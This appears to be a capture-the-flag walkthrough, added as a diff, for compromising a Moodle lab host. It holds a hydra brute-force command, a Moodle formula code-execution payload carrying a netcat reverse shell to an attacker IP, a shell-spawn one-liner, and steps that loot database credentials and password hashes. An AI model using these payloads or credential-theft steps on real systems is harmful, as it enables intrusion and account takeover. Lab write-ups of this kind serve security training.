@@ -1,0 +1,51 @@
+#10.10.10.153
+#PORT - 80
+
+#run dirb {found = /images , /moodle}
+#chechk all images in /images folder
+#get the content of an image that is not displayed
+cat 5.png
+
+#create passwd list
+#brute-force for password
+hydra -l Giovanni -P brute.txt 10.10.10.153 http-post-form "/moodle/login/index.php:anchor=&username=^USER^&password=^PASS^:Invalid login" -V
+----------------------------------------------------------
+#wfuzz to brute force        (didn't work)
+( wfuzz -c -w brute.txt -H "Cookie: MoodleSession=uo4ufvp8jnkltlpihp1i8mf6q4" -d "anchor=&username=Giovanni&password=FUZZ" --hs "Invalid login" http://10.10.10.153/moodle/login/index.php )
+----------------------------------------------------------
+#passwd= Th4C00lTheacha#
+#username= Giovanni
+
+#open login page - /moodle
+#google:-  moodle exploit (open 'Evil Teacher' link)
+>>>https://blog.ripstech.com/2018/moodle-remote-code-execution/    |  formula==   /*{a*/`$_GET[0]`;//{x}}   
+#follow it
+#add this into url to get reverse shell and be ready with:-  nc -nvlp 4444
+&0=(nc -e /bin/sh 10.10.12.88 4444)
+
+
+-------------------------------------------------
+########### INSIDE LOW PRIVILAGE SHELL ###########
+
+#do shell spawn for better use
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+#search for configuration file (config.php) file on database  ==  /var/www/html/moodle/config.php
+#username= root  (mysql credentials)
+#passwd= Welkom1!
+
+#login to mysql database
+mysql -u root -p
+show databases;
+use moodle;
+show tables;
+describe mdl_user;
+select * from mdl_user;	
+#passwd = 7a860966115182402ed06375cf0a22af  (md5_decrypt == expelled )
+#username = giovanni
+
+#now login to user giovanni
+su giovanni
+
+#key
+fa9ae187462530e841d9e61936648fa7
